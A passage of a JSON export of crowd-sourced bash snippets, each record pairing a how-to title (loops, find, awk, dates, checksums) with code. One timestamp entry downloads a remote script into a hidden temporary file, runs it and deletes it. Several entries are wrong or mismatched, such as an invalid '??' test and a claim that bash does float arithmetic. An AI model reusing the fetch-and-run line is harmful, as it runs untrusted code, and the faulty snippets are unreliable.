    "description": "# Source: https://www.tutorialkart.com/bash-shell-scripting/bash-date-format-options-examples/ date '+<format-option><format-option> <format-option>' # For example: echo $(date '+%A') date=$(date '+%A')  # Formats: # date +%a\tWeekday\tName of weekday in short (like Sun, Mon, Tue, Wed, Thu, Fri, Sat)\tMon # date +%A\tWeekday\tName of weekday in full (like Sunday, Monday, Tuesday)\tMonday # date +%b\tMonth\tName of Month in short (like Jan, Feb, Mar )\tJan # date +%B\tMonth\tMonth name in full short (like January, February)\tJanuary # date +%d\tDay\tDay of month (e.g., 01)\t04 # date +%D\tMM/DD/YY\tCurrent Date; shown in MM/DD/YY\t02/18/18 # date +%F\tYYYY-MM-DD\tDate; shown in YYYY-MM-DD\t2018-01-19 # date +%H\tHour\tHour in 24-hour clock format\t18 # date +%I\tHour\tHour in 12-hour clock format\t10 # date +%j\tDay\tDay of year (001..366)\t152 # date +%m\tMonth\tNumber of month (01..12) (01 is January)\t05 # date +%M\tMinutes\tMinutes (00..59)\t52 # date +%S\tSeconds\tSeconds (00..59)\t18 # date +%N\tNanoseconds\tNanoseconds (000000000..999999999)\t300231695 # date +%T\tHH:MM:SS\tTime as HH:MM:SS (Hours in 24 Format)\t18:55:42 # date +%u\tDay of Week\tDay of week (1..7); 1 is Monday\t7 # date +%U\tWeek\tDisplays week number of year, with Sunday as first day of week (00..53)\t23 # date +%Y\tYear\tDisplays full year i.e. YYYY\t2018 # date +%Z\t Timezone\tTime zone abbreviation (Ex: IST, GMT)\tIST\n",
    "reg_date": "2021-10-11T22:01:29.000Z"
  },
  {
    "id": 571,
    "keyword": null,
    "link": null,
    "title": " bash display items in array",
    "description": "$ printf '%s\\n' \"${my_array[@]}\"\n",
    "reg_date": "2021-10-11T22:01:30.000Z"
  },
  {
    "id": 572,
    "keyword": null,
    "link": null,
    "title": " bash display properly aligned columns",
    "description": "# Basic syntax: column -t input_file  # Example usage: # Say you have a file that contains the following text. Even though the # columns are tab-delimited, they aren't aligned well and it's difficult # to read them.  a       bdstdydgfhgjhdgfhgjh    c d       e       f g       h       i  # After running column -t input_file on your file, you'd see: a  bdstdydgfhgjhdgfhgjh  c d  e                     f g  h                     i  # Note, if you want to see fields without any wrapping, you can also #\tpipe to less -S. E.g.: column -t input_file | less -S\n",
    "reg_date": "2021-10-11T22:01:30.000Z"
  },
  {
    "id": 573,
    "keyword": null,
    "link": null,
    "title": " bash download file to specific directory",
    "description": "# Basic syntax: wget --directory-prefix <directory> <url_of_target_file>\n",
    "reg_date": "2021-10-11T22:01:30.000Z"
  },
  {
    "id": 574,
    "keyword": null,
    "link": null,
    "title": " bash echo to stderr",
    "description": ">&2 echo \"error\"\n",
    "reg_date": "2021-10-11T22:01:30.000Z"
  },
  {
    "id": 575,
    "keyword": null,
    "link": null,
    "title": " bash endless loop",
    "description": "#!/bin/bash while true do \techo \"Press [CTRL+C] to stop..\" \tsleep 1 done\n",
    "reg_date": "2021-10-11T22:01:30.000Z"
  },
  {
    "id": 576,
    "keyword": null,
    "link": null,
    "title": " bash errors: syntax error - ambiguous - file",
    "description": "$ echo hello > bash: syntax error near unexpected token `newline`  $ echo hello > ${NONEXISTENT} bash: ${NONEXISTENT}: ambiguous redirect  $ echo hello > \"${NONEXISTENT}\" bash: : No such file or directory \n",
    "reg_date": "2021-10-11T22:01:30.000Z"
  },
  {
    "id": 577,
    "keyword": null,
    "link": null,
    "title": " bash find all files containing string",
    "description": "grep -r '/path/to/somewhere/' -e 'pattern'\ngrep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:01:30.000Z"
  },
  {
    "id": 578,
    "keyword": null,
    "link": null,
    "title": " bash find file by name",
    "description": "find . -name 'mystring*'\n# syntax  # find *</path/to/dir> '(' *<filter-1> -o *<filter-2> ')'  # example  find . '(' -name '*ERR5312209.zip' -o -name '*ERR5312209.TXT' ')'\n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 579,
    "keyword": null,
    "link": null,
    "title": " bash find files with extension",
    "description": " # syntax find </path/to/dir> -name '.<extension>'  # example  find /export/home/jacquesk -name '*.txt'  # This will search in folder-path (including subdirectories)  # of \"/export/home/jacquesk\", and will show any files  # that end in '.txt'\n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 580,
    "keyword": null,
    "link": null,
    "title": " bash find full path",
    "description": "find \"$(pwd -P)\" -name \"filename\"\n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 581,
    "keyword": null,
    "link": null,
    "title": " bash find in all subdirectories",
    "description": "find . -name \"foo*\"\n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 582,
    "keyword": null,
    "link": null,
    "title": " bash find only first answer",
    "description": "find *pattern | head -n 1  \n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 583,
    "keyword": null,
    "link": null,
    "title": " bash firebase command not found",
    "description": "alias firebase=\"`npm config get prefix`/bin/firebase\"\n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 584,
    "keyword": null,
    "link": null,
    "title": " bash flatten directory",
    "description": "find /dir1 -mindepth 2 -type f -exec mv -t /dir1 -i '{}' + \n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 585,
    "keyword": null,
    "link": null,
    "title": " bash float division",
    "description": "bc -l <<< '10/3' # Fast way 3.33333333333333333333 bc <<< 'scale=2; 10/3' #Define also how many decimals to take in scale 3.33\n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 586,
    "keyword": null,
    "link": null,
    "title": " bash float operation",
    "description": "bc -l <<< '10/3' # Fast way 3.33333333333333333333 bc <<< 'scale=2; 10/3' #Define also how many decimals to take in scale 3.33\n",
    "reg_date": "2021-10-11T22:01:31.000Z"
  },
  {
    "id": 587,
    "keyword": null,
    "link": null,
    "title": " bash for-schleife 1 bis 10",
    "description": "#Just use command seq to iterate a range from start to end END=10 for i in $(seq 1 $END); do echo $i; done\n",
    "reg_date": "2021-10-11T22:01:32.000Z"
  },
  {
    "id": 588,
    "keyword": null,
    "link": null,
    "title": " bash for each line of file",
    "description": "while read p; do   echo \"$p\" done <peptides.txt\n",
    "reg_date": "2021-10-11T22:01:32.000Z"
  },
  {
    "id": 589,
    "keyword": null,
    "link": null,
    "title": " bash for loop",
    "description": "for i in {1..5} do    echo \"Welcome $i times\" done\n#!/bin/bash for (( c=1; c<=5; c++ )) do      echo \"Welcome $c times\" done \n#!/bin/bash  # A simple bash \"for loop\" example below... # This loop will run 5 times, and will echo the number in sequence as it goes. # Mind the double . between the {} # Note how the variable is called with the $ prefix, which can be done within the \"\" quotes!  for i in {1..5} do    echo \"This is loop number $i\" done  # To achieve the same in a single line is also simple  for i in {1..5};do echo \"this is loop number $i\";done  ## Happy coding, my homies! <3\nyears=(2018 2019) days=(74 274)  for year in \"${years[@]}\"; do     for day in $(seq -w ${days[0]} ${days[1]}); do                echo $year                echo $day     done done\nfor VARIABLE in file1 file2 file3 do \tcommand1 on $VARIABLE \tcommand2 \tcommandN done\nfor FILE in $(ls -A); do la $FILE; done\n",
    "reg_date": "2021-10-11T22:01:32.000Z"
  },
  {
    "id": 590,
    "keyword": null,
    "link": null,
    "title": " bash for stdin",
    "description": "while read line ; do  echo \"$line\" ; done < \"${1:-/dev/stdin}\" \n",
    "reg_date": "2021-10-11T22:01:32.000Z"
  },
  {
    "id": 591,
    "keyword": null,
    "link": null,
    "title": " bash fully unsquash sqfs file",
    "description": "# Basic syntax: unsquashfs -l file.sqfs # Where .sqfs is a squash file, which is a type of data compression\n# Basic syntax: unsquashfs -d /path/to/directory file.sqfs  # Note, the output directory \"directory\" should not exist before this is #\trun, it will be created when you run the command\n",
    "reg_date": "2021-10-11T22:01:32.000Z"
  },
  {
    "id": 592,
    "keyword": null,
    "link": null,
    "title": " bash get current date",
    "description": "# syntax $(date)  # example (when running the command of \"date\") echo $(date)  # OUTPUT: Mon May 11 13:20:57 SAST 2020 # To return a specific FORMAT, search \"bash get date format\" \ndate +'FORMAT'   ### mm/dd/yyyy ### date +'%m/%d/%Y'   ## Time in 12 hr format ### date +'%r'   ## backup dir format ## backup_dir=$(date +'%m/%d/%Y') echo \"Backup dir for today: /nas04/backups/${backup_dir}\"\n",
    "reg_date": "2021-10-11T22:01:32.000Z"
  },
  {
    "id": 593,
    "keyword": null,
    "link": null,
    "title": " bash get current path",
    "description": "import os os.path.dirname(os.path.abspath(__file__))\nrequest.url # => \"http://localhost:3000/lists/7/items\" request.path # => \"/lists/7/items\"\necho $PWD\nscriptdir = CreateObject(\"Scripting.FileSystemObject\").GetParentFolderName(WScript.ScriptFullName)\n#Will generate the current directory pwd\ntype -a <command> \n",
    "reg_date": "2021-10-11T22:01:32.000Z"
  },
  {
    "id": 594,
    "keyword": null,
    "link": null,
    "title": " bash get kernel version",
    "description": "cat /proc/version\n$ cat /proc/version\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 595,
    "keyword": null,
    "link": null,
    "title": " bash get last field in line",
    "description": "Use rev command altogether with cut command as follows: echo \"a1 a2 a3 a4 a5\" | rev | cut -d ' ' -f '1' | rev #rev reverses string, then you cut from 2th field to end and reverse back\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 596,
    "keyword": null,
    "link": null,
    "title": " bash get one checksum for many files",
    "description": "# Basic syntax: find /directory/to/search -type f -exec md5sum {} + | awk '{print $1}' | sort | md5sum > single_md5sum.txt  # Where: #\t- find -type f returns all files (but not directories) in  #\t\t/directory/to/search and its subdirectories #\t- -exec md5sum {} obtains the md5 checksums for all files returned  #\t\twith find #\t- awk '{print $1}' | sort returns the sorted md5 checksums #\t- and finally, md5sum is run on the sorted list of md5 checksums to #\t\treturn one md5 checksum for all the files\n# Basic syntax: md5sum /path/to/directory/* > list_of_checksums  # Note, md5sum will run on any files that are found with your search # \tpattern. For example: md5sum /path/*/*files_I_want* > list_of_checksums # This would process all files than contain the substring \"files_I_want\" # in all directories in the \"path\" directory\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 597,
    "keyword": null,
    "link": null,
    "title": " bash get path from filename",
    "description": "# Basic syntax: dirname /full/file/name.txt  # Example usage: dirname /full/file/name.txt --> /full/file  # Note, if you want just the file name, use basename, e.g.: basename /full/file/name.txt --> name.txt\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 598,
    "keyword": null,
    "link": null,
    "title": " bash get timestamp",
    "description": "// If you want to get unix timestamp, then you need to use: timestamp=$(date +%s)\n# put current date as yyyy-mm-dd in $date # -1 -> explicit current date, bash >=4.3 defaults to current time if not provided # -2 -> start time for shell printf -v date '%(%Y-%m-%d)T\\n' -1   # put current date as yyyy-mm-dd HH:MM:SS in $date printf -v date '%(%Y-%m-%d %H:%M:%S)T\\n' -1   # to print directly remove -v flag, as such: printf '%(%Y-%m-%d)T\\n' -1 # -> current date printed to terminal \ntimestamp=`date +%Y%m%d%H%M%S` curl -s http://mywebsite.com/myscript.txt -o /tmp/.myscript.${timestamp}.tmp bash /tmp/.myscript.${timestamp}.tmp rm -f /tmp/.myscript.${timestamp}.tmp \ndate +%s   # Give the number of seconds since epoch\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 599,
    "keyword": null,
    "link": null,
    "title": " bash hide command output",
    "description": "mycommand &>/dev/null\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 600,
    "keyword": null,
    "link": null,
    "title": " bash how to check free disk space in Linux",
    "description": "# Basic syntax: df -h # Where the -h flag ensures a \"human readable\" format\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 601,
    "keyword": null,
    "link": null,
    "title": " bash how to download files from a list of links",
    "description": "# Basic syntax: wget -i list_of_links.txt  # Example usage: # If you had a list_of_links.txt file containing a list of links like: www.example.com/1.pdf www.example.com/2.pdf www.example.com/3.pdf  wget -i list_of_links.txt # Running this would download all files listed #\tin the list_of_links.txt file\n",
    "reg_date": "2021-10-11T22:01:33.000Z"
  },
  {
    "id": 602,
    "keyword": null,
    "link": null,
    "title": " bash how to download password protected files",
    "description": "# Basic syntax: # Download a single password protected file: wget http://url/file --user=username --password=password --directory-prefix=/path/to/output/directory  # Recursively download a directory of password protected files: wget -r --no-parent http://url/directory/ --user=username --password=password --directory-prefix=/path/to/output/directory  # Where: #\t- -r means recursively #\t- --no-parent tells wget to avoid getting files from any  #\t\tparent directories of directory  # Note, for directories, it's important to add the trailing / to the url\n",
    "reg_date": "2021-10-11T22:01:34.000Z"
  },
  {
    "id": 603,
    "keyword": null,
    "link": null,
    "title": " bash how to generate md5 checksums on all files in a directory",
    "description": "# Basic syntax: md5sum /path/to/directory/* > list_of_checksums  # Note, md5sum will run on any files that are found with your search # \tpattern. For example: md5sum /path/*/*files_I_want* > list_of_checksums # This would process all files than contain the substring \"files_I_want\" # in all directories in the \"path\" directory\n",
    "reg_date": "2021-10-11T22:01:34.000Z"
  },
  {
    "id": 604,
    "keyword": null,
    "link": null,
    "title": " bash how to keep one instance of duplicate lines",
    "description": "# Basic syntax: sort input_file | uniq # Sort the file first because uniq requires a sorted file to work. Uniq # then eliminates all duplicated lines in the file, keeping one instance # of each duplicated line\n",
    "reg_date": "2021-10-11T22:01:34.000Z"
  },
  {
    "id": 605,
    "keyword": null,
    "link": null,
    "title": " bash how to leave a process running on remote server",
    "description": "# Short answer: # Learn how to use screen  # Basic syntax: # After logging in to remote server run: screen # This starts a new screen.   # After starting a long process, e.g., a download, detach with: CTRL+a d # To detach from screen, press CTRL+a, release, then press d  # To view active screens: screen -ls  # To resume active screen: screen -r # If there is only one active screen screen -r screen_number # If there are multiple active screens\n",
    "reg_date": "2021-10-11T22:01:34.000Z"
  },
  {
    "id": 606,
    "keyword": null,
    "link": null,
    "title": " bash how to list all variables",
    "description": "printenv\n",
    "reg_date": "2021-10-11T22:01:34.000Z"
  },
  {
    "id": 607,
    "keyword": null,
    "link": null,
    "title": " bash how to print the directory structure in linux",
    "description": "# Process: 1. Install the tree package with your favorite linux/unix installer, e.g. \tsudo apt-get install tree\t# Using apt-get installer     brew install tree\t\t\t# Using brew installer 2. Run tree to see directory structure, e.g.: \ttree /directory/to/visualize/  # Note, you can specify the depth you want to visualize with the -L flag # \tand you can display only directories with the -d flag, e.g.: \ttree -L 1 # Print the directories in the current directory     tree -L 2 # Print current and subdirectories and files     tree -L 2 -d # Print current and subdirectories  # Note, if you use tree a lot, using the following aliases can save you  # some time: \talias tree1='tree -L 1'     alias tree2='tree -L 2'     alias tree3='tree -L 3'\n",
    "reg_date": "2021-10-11T22:01:34.000Z"
  },
  {
    "id": 608,
    "keyword": null,
    "link": null,
    "title": " bash how to remove all whitespace from a file",
    "description": "# Example usage: awk '{gsub(\" \",\"\",$0); print $0;}' input_file # This replaces every space \" \" with nothing \"\", thereby eliminating all # whitespace from the file  # Basic syntax: awk '{gsub(regex, substitution_text, $field#); print $0;}' input_file # Where: #\t- gsub is a function that replaces every regular expression (regex) #\t\tmatch with substitution_text.  #\t- $field# is optional but can be used to specify a particular field #\t\twhere gsub should operate. (This is useful if you want to  #\t\trestrict the substitutions to a specific column)  \ncat file.txt | tr -d \" \\t\\n\\r\" \n",
    "reg_date": "2021-10-11T22:01:34.000Z"
  },
  {
    "id": 609,
    "keyword": null,
    "link": null,
    "title": " bash how to remove rows if specific field is blank",
    "description": "# Basic syntax: awk -F'delimiter' '$column# != \"\"' input_file  # Example usage: awk -F'\\t' '$3 != \"\"' input_file # This prints every line in which the 3rd tab-delimited column is  # not blank. Change the 3 to any column and/or add other conditions  # for your application\n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 610,
    "keyword": null,
    "link": null,
    "title": " bash how to transpose a column",
    "description": "# Basic syntax: operation producing a column of text/data | paste -s  # Where paste -s prints the data on a single row  # Example usage: Given a file named input_file that has these contents: A\t23 B\t42 C\t17  cut -f 2 | paste -s awk '{print $2}' | paste -s  would both print: --> 23\t42\t17  # Note, use the -d flag to change the delimiter of the paste output\n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 611,
    "keyword": null,
    "link": null,
    "title": " bash if greater than",
    "description": "if (( a > b )); then     ... fi #Use above example or below one: if [ \"$a\" -gt \"$b\" ]; then     ... fi\n-eq is equal to  if [ \"$a\" -eq \"$b\" ]  -ne is not equal to  if [ \"$a\" -ne \"$b\" ]  -gt is greater than  if [ \"$a\" -gt \"$b\" ]  -ge is greater than or equal to  if [ \"$a\" -ge \"$b\" ]  -lt is less than  if [ \"$a\" -lt \"$b\" ]  -le is less than or equal to  if [ \"$a\" -le \"$b\" ]\n# In bash, you should do your check in arithmetic context:  if (( a > b )); then     ... fi  # For POSIX shells that don't support (()), you can use -lt and -gt.  if [ \"$a\" -gt \"$b\" ]; then     ... fi\n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 612,
    "keyword": null,
    "link": null,
    "title": " bash if substring",
    "description": "string='Hi substring' #To check if string has \"Mylong\" substring do if [[ $string == *\"substring\"* ]]; then   echo \"String has substring\" fi\nstring='Haystack';  if [[ $string =~ \"Needle\" ]] then    echo \"It's there!\" fi\n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 613,
    "keyword": null,
    "link": null,
    "title": " bash if then else one line",
    "description": "if [[ CONDITION_STATEMENT ]]; then SOME_CODE; else OTHER_CODE; fi\n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 614,
    "keyword": null,
    "link": null,
    "title": " bash install kubectl",
    "description": "curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl chmod +x ./kubectl sudo mv ./kubectl /usr/local/bin/kubectl kubectl version --client\ncurl -LO \"https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl\" chmod +x ./kubectl sudo mv ./kubectl /usr/bin/kubectl # you can replace /usr/bin for some dir in your PATH\ncurl -LO https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl \ncurl -LO https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/windows/amd64/kubectl.exe \n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 615,
    "keyword": null,
    "link": null,
    "title": " bash iterate over lines of a file",
    "description": "while read p; do   echo \"$p\" done <peptides.txt \n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 616,
    "keyword": null,
    "link": null,
    "title": " bash limit memory use of a function",
    "description": "systemd-run --scope -p MemoryMax=500M pdftoppm \n",
    "reg_date": "2021-10-11T22:01:35.000Z"
  },
  {
    "id": 617,
    "keyword": null,
    "link": null,
    "title": " bash list all files that contain pattern",
    "description": "# Basic syntax: ls search_pattern  # Example usage: # Say you have a directory containing the following files and you only # want to list .png files file1.txt file2.txt image1.png image2.png  # Typing: ls *.png # Will return: --> image1.png \timage2.png\n",
    "reg_date": "2021-10-11T22:01:36.000Z"
  },
  {
    "id": 618,
    "keyword": null,
    "link": null,
    "title": " bash list process on port",
    "description": "sudo lsof -i:3000 #Just change the port 3000\n",
    "reg_date": "2021-10-11T22:01:36.000Z"
  },
  {
    "id": 619,
    "keyword": null,
    "link": null,
    "title": " bash list the top ten largest values in a column",
    "description": "# Example usage: sort -k3n,3 input_file | tail -10 # Here we sort the input_file in numerical order based on the third  # field and then pipe to tail to print the last ten rows.   # If you only want to return specific fields from the sorted file, pipe # to cut. E.g. to return the largest values from the third field: sort -k3n,3 input_file | tail -10 | cut -f 3\n",
    "reg_date": "2021-10-11T22:01:36.000Z"
  },
  {
    "id": 620,
    "keyword": null,
    "link": null,
    "title": " bash loop over files in directory",
    "description": "#!/bin/bash for filename in /Data/*.txt; do     ... done\n# Basic syntax: for filename in `cat file_of_filenames.txt`; do \techo $filename done  # This iterates through each of the filenames listed in the  #\tfile_of_filenames.txt # Note, the filenames should be separated by spaces or new-lines\n",
    "reg_date": "2021-10-11T22:01:36.000Z"
  },
  {
    "id": 621,
    "keyword": null,
    "link": null,
    "title": " bash loop over files in file",
    "description": "#!/bin/bash for filename in /Data/*.txt; do     ... done\n# Basic syntax: for filename in `cat file_of_filenames.txt`; do \techo $filename done  # This iterates through each of the filenames listed in the  #\tfile_of_filenames.txt # Note, the filenames should be separated by spaces or new-lines\nfor i in *.java; do     [ -f \"$i\" ] || break     ... done \n",
    "reg_date": "2021-10-11T22:01:36.000Z"
  },
  {
    "id": 622,
    "keyword": null,
    "link": null,
    "title": " bash make directories using specific text from filenames",
    "description": "# Basic syntax: for file in /input/directory/search_pattern; do \tsubstring=${file:start#:length} \tmkdir \"/output/directory/prepended_text_${substring}_appended_text\" done  # Where: #\t- The search_pattern should return the set of files you want to #\tuse for making the new directories #\t- The substring function takes the start character number and the  #\tlength of the substring to use  # Example usage: # Say you have a directory with the following files and you want to use # the middle part of the consistent filenames to make new directories: filename_ABC_123.txt filename_DEF_123.txt filename_GHI_123.txt some_other_file_in_the_directory.txt  for file in ./*123.txt; do # Process files in current directory that end in 123.txt \tsubstring=${file:11:3} # Use  \tmkdir \"/output/directory/prepended_text_${substring}_appended_text\" done  # The /output/directory/ would now have subdirectories named: prepended_text_ABC_appended_text prepended_text_DEF_appended_text prepended_text_GHI_appended_text\n",
    "reg_date": "2021-10-11T22:01:36.000Z"
  },
  {
    "id": 623,
    "keyword": null,
    "link": null,
    "title": " bash make multiple directories in current directory",
    "description": "# Basic syntax: mkdir directory1 directory2 directory3 # Make directory1, 2, and 3 in the #\tcurrent directory\n# Example usage: for dir in */; do mkdir -- \"$dir\"/{dir1,dir2,dir3}; done # This creates directories dir1, dir2, and dir3 in all directories  # found in the current directory.\n",
    "reg_date": "2021-10-11T22:01:36.000Z"
  },
  {
    "id": 624,
    "keyword": null,
    "link": null,
    "title": " bash math expression",
    "description": "# Basic syntax: $((your_expression))  # Example usage: echo $(((5 * 4)/3)) --> 6  # Note, if you only use integers in your expression, the answer will be #\trounded down to the nearest integer echo $(((5 * 4.0)/3))                                                                                                                                                                                                                                             100%   --> 6.666666666666667\n",
    "reg_date": "2021-10-11T22:01:38.000Z"
  },
  {
    "id": 625,
    "keyword": null,
    "link": null,
    "title": " bash message partial match",
    "description": "if [[ $string == *\"foo\"* ]]; then   echo \"It's there!\" fi\nstring=\"My string\" \nif [ $string ?? 'foo' ]; then   echo \"It's there!\" fi \n",
    "reg_date": "2021-10-11T22:01:38.000Z"
  },
  {
    "id": 626,
    "keyword": null,
    "link": null,
    "title": " bash move a list of files",
    "description": "# Basic syntax: mv `cat list_of_files` /new/directory  # Note, the filenames in the list_of_files can be separated by spaces or #\tby new lines # Note, just replace mv with cp if you want to copy a list of files to #\ta new directory instead of moving them\n",
    "reg_date": "2021-10-11T22:01:38.000Z"
  },
  {
    "id": 627,
    "keyword": null,
    "link": null,
    "title": " bash mysql query  count get only number",
    "description": "mysql -h {host} -u {user} -p{password}  -e \"SELECT COUNT(DISTINCT table_name) FROM information_schema.columns WHERE table_schema = '{dbname}'\" | grep -iv \"count\"\n",
    "reg_date": "2021-10-11T22:01:39.000Z"
  },
  {
    "id": 628,
    "keyword": null,
    "link": null,
    "title": " bash only print duplicated lines",
    "description": "# Basic syntax: sort input_file | uniq -d # Sort the file first because uniq requires a sorted file to work  # Note, uniq -d only prints one instance of lines that have duplicates #\tUse, uniq -c to count the number of duplicates in the file\n",
    "reg_date": "2021-10-11T22:01:39.000Z"
  },
  {
    "id": 629,
    "keyword": null,
    "link": null,
    "title": " bash or",
    "description": "if [ \"$1\" = \"a.txt\" ] || [ \"$2\" = \"c.txt\" ]; then \t# do smt... fi\n",
    "reg_date": "2021-10-11T22:01:39.000Z"
  },
  {
    "id": 630,
    "keyword": null,
    "link": null,
    "title": " bash parameter count",
    "description": "# use $#  # say if you are expecting exactly 2 parameters # -ne is bash's way of saying not equal if [[ \"$#\" -ne 2 ]]; then \techo \"this script needs exactly 2 parameters\"     exit 1  fi\n",
    "reg_date": "2021-10-11T22:01:40.000Z"
  },
  {
    "id": 631,
    "keyword": null,
    "link": null,
    "title": " bash perform operation on all files in directory",
    "description": "# Basic syntax: find . -maxdepth 1 -type f -exec your_command {} \\; # Where: #\t- . specifies the current directory (this can be changed to any #\t\tdirectory) #\t- -maxdepth 1 prevents find from searching directories recursively #\t- -type f specifies that the operation should only be performed on #\t\tfiles (not directories) #\t- -exec runs your_command on all files that are found\n",
    "reg_date": "2021-10-11T22:01:41.000Z"
  },
  {
    "id": 632,
    "keyword": null,
    "link": null,
    "title": " bash print array",
    "description": "$ printf '%s\\n' \"${my_array[@]}\"\necho \"${array[*]}\"\necho  ${resnew[0]} - first element echo  ${resnew[1]}  - second element    echo last : ${resnew[$(($res_len -1))]}  last element  echo last : ${resnew[        $(($res_len -1))                              ]}  last element              ^resnew_array[  ^get value from varible by solving $res_len-1  ^array close \n",
    "reg_date": "2021-10-11T22:01:42.000Z"
  },
  {
    "id": 633,
    "keyword": null,
    "link": null,
    "title": " bash print count of unique words in column",
    "description": "# Example usage: awk -F '\\t' '{print $7}' input_file | sort | uniq -c # Breakdown:  # awk returns the 7th tab-delimited column/field of the input_file # sort sorts the entries so that duplicate entries are adjacent # uniq -c returns the counts of each type of element  # Note, add \"| cut -c 9-\" to remove the counts if you only want the # \tunique values found in the column/field \n",
    "reg_date": "2021-10-11T22:01:42.000Z"
  },
  {
    "id": 634,
    "keyword": null,
    "link": null,
    "title": " bash print keys of awk array",
    "description": "# Example usage for printing keys: awk '{ a[$1]=$2 } END { for (key in a) { print key } }' input_file # Where: #\t- The above statement prints all keys in the awk array/dictionary #\t\tmade from the input_file #\t- a[$1] is an array/dictionary in which the first column ($1) is  #\t\tused as the key and the second column ($2) is used as the value #\t- END indicates what to do after the first statement has finished  #\t\trunning. Here we start a loop that loops through the keys in the #\t\tarray and prints them  # Example usage for printing key values: awk '{ a[$1]=$2 } END { for (key in a) { print a[key] } }' input_file # Where: #\t- The above statement prints all key values in the awk  #\t\tarray/dictionary made from the input_file\n# Error: awk: can't read value of a; it's an array name.  # Solution: # This error usually comes up if you're trying to print the keys or  # values from an awk array (i.e. dictionary) incorrectly. To do this  # properly, you need to loop over the keys in your array.  # Example usage for printing keys: awk '{ a[$1]=$2 } END { for (key in a) { print key } }' input_file # Where: #\t- The above statements prints all keys in the awk array/dictionary #\t\tmade from the input_file #\t- a[$1] is an array/dictionary in which the first column ($1) is  #\t\tused as the key and the second column ($2) is used as the value #\t- END indicates what to do after the first statement has finished  #\t\trunning. Here we start a loop that loops through the keys in the #\t\tarray and prints them.   # Example usage for printing key values: awk '{ a[$1]=$2 } END { for (key in a) { print a[key] } }' input_file # Where: #\t- The above statements prints all key values in the awk  #\t\tarray/dictionary made from the input_file\n",
    "reg_date": "2021-10-11T22:01:42.000Z"
  },
  {
    "id": 635,
    "keyword": null,
    "link": null,
    "title": " bash print line if column value is in column of another file",
    "description": "# Example usage: awk 'FNR==NR{a[$1]=$1; next}; $8 in a {print $0;}' input_file_1 input_file_2 # This command prints rows from input_file_2 if the value in a specific #\tfield of input_file_2 is found in a specific column of input_file_1. #\tWith these specific numbers, this function prints the row from  #\tinput_file_2 if the value in column 8 is present in column 1 of  #\tinput_file_1.\n",
    "reg_date": "2021-10-11T22:01:43.000Z"
  },
  {
    "id": 636,
    "keyword": null,
    "link": null,
    "title": " bash print lines that dont have a word",
    "description": "# Basic syntax: grep -v word input_file # This prints all lines of the input_file that don't contain \"word\"  # Note, even lines that contain the substring \"word\" are removed\n",
    "reg_date": "2021-10-11T22:01:43.000Z"
  },
  {
    "id": 637,
    "keyword": null,
    "link": null,
    "title": " bash print lines that match any of several words",
    "description": "# Basic syntax: grep 'word1\\|word2\\|word3' /path/to/file # This prints all lines that match word1, word2, OR, word3\n",
    "reg_date": "2021-10-11T22:01:43.000Z"
  },
  {
    "id": 638,
    "keyword": null,
    "link": null,
    "title": " bash print rows that contain substring in field",
    "description": "# Basic syntax using awk: awk -F'delimiter' 'index($field#, \"substring\")' input_file # Where: #\t- -F'delimiter' is the delimiter used in the input_file #\t- index checks whether substring is found in the specified field. If #\t\tit is, that line is printed  # Example usage using awk: # Say you have a file with the following lines and want to print lines  # that contain the substring \"target\" in the second column tab\tseparated\tfile\tfull of\ttargeted\twords\tin targeted\tcolumns\tof\ttext  # Running awk -F'\\t' 'index($2, \"target\")' input_file  # Would return: of\ttargeted\twords\tin  # Note, you can use $0 to look for the substring in the whole row\n",
    "reg_date": "2021-10-11T22:01:44.000Z"
  },
  {
    "id": 639,
    "keyword": null,
    "link": null,
    "title": " bash random number",
    "description": "$(( ( RANDOM % 10 )  + 1 ))\n$ echo $(( $RANDOM % 10 ))\n#If you have coreutils installed and want a number inbewtween a value shuf -i MIN-MAX -n 1 #or you can use bash  $RANDOM\n",
    "reg_date": "2021-10-11T22:01:44.000Z"
  },
  {
    "id": 640,
    "keyword": null,
    "link": null,
    "title": " bash read a file line by line",
    "description": "#!/bin/bash input=\"/path/to/txt/file\" while IFS= read -r line do   echo \"$line\" done < \"$input\"\nwhile read p; do   echo \"$p\" done <peptides.txt\n",
    "reg_date": "2021-10-11T22:01:44.000Z"
  },
  {
    "id": 641,
    "keyword": null,
    "link": null,
    "title": " bash redirect stdout and stderr to the same file",
